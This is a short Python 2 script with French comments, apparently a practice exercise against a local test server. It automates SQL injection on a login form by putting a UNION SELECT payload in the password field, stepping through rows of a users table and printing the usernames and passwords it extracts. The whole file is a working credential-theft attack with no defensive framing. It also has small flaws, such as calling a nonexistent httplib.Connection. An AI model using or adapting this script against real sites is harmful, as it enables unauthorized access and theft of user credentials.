#!C:\Python36/python.exe
#script injection pour recuperation identifiant and pass
import httplib, urllib
site ="127.0.0.1"
port=80
formulaire = "path/oftheforulaire"

 #definition des champs de formulaire
identif="test"
mdp=""
ref= "identification"
valider="Valider"
for champ in range(1,10):
    #creation du champ mot de passe avec imcementatio du decalage
    mdp="' UNION SELECT identifiant, motdepasse FROM users LIMIT "+str(champ)+",1#"
    #creation des parm a poster
    params= urllib.urlencode({'identif':identif,'mdp':mdp,'ref':ref,'valider':valider,'valider':'Rechercher'})
    #creation header
    headers={"Content-type":"application/x-www-form-urlencoded","Accept":"text/plain"}
    #connect to the website
    conn=httplib.Connection(site+":"+str(port))
    #send the request
    conn.request("POST",formulaire,params,headers)
    reponse=conn.getresponse()
    code_retour=reponse.status
    if(code_retour==200):
        data=reponse.read()
        position1 =data.find('Votre')
        position2=data.find('</form>')
        #extraction des donnees
        donne = data[position1:position2-1]
        print(donne)

conn.close()
